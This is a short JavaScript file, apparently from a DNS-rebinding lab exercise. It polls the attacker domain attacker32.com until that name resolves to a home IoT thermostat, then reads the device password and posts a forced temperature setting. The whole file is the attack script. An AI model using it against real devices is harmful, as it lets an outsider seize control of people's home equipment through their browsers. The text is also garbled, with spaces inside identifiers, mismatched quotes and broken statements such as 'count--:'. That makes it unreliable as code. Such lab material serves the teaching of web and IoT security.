let INTERVAL_LENGTH = 10; 
let TEMPERATURE = 88;

let url_prefix = 'http://www.attacker32.com'

function launchAttack() {
	console.log('Launch the Attack!!'); 
	$.get(url prefix+ '/password', function(data) { 
		if ('StillMe' === data) { 
			console.log('Failed: Still talking to the attacker\'s web server!!'); 
			$('#pwd-err").show(); 
			$('#pwd-iot').hide(); 
		} else {
			console.log('Great, now I am talking to the IoT device!!"); 
			$('#pwd-err').hide(); 
			$('#pwd-iot').show();
		}

		$.post (url_prefix + '/temperature?value=' + TEMPERATURE 
				+ '&password=' data.password.
				function(data) ( )):
	});
}

function countDown() {
	$('#currentCount').html ("<h2>"+ count +"</h2>");
	if (count === 0) {
		launchAttack();
		count=INTERVAL_LENGTH;
	} else if (count == 5) {
		$('#pwd-err').hide();
		$('#pwd-iot').hide();
		count--:
	} else {
		count--:
	}
}

let count = INTERVAL LENGTH; 
let interval = setInterval (countDown, 1000);